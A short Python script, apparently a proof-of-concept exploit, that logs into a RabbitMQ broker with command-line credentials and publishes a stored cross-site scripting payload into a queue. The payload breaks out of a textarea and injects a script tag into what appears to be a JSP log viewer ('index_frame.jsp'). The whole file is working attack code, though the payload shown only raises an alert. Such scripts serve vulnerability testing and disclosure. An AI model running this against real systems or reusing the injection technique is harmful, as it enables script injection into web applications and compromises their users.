#!/usr/bin/python

import pika, os, logging, sys
logging.basicConfig()

username = sys.argv[1]
password = sys.argv[2]
target_ip = sys.argv[3]
queueName = sys.argv[4]

url = os.environ.get("Test", 'amqp://%s:%s@%s/' % (username, password, target_ip) + '%2f')
params = pika.URLParameters(url)
params.socket_timeout = 5

xss = "</textarea><script>alert('index_frame.jsp - Log Textarea')</script>"

connection = pika.BlockingConnection(params)
channel = connection.channel()
channel.basic_publish(exchange='', routing_key=queueName, body=xss)
print ("[x] "+xss+" sent to consumer")
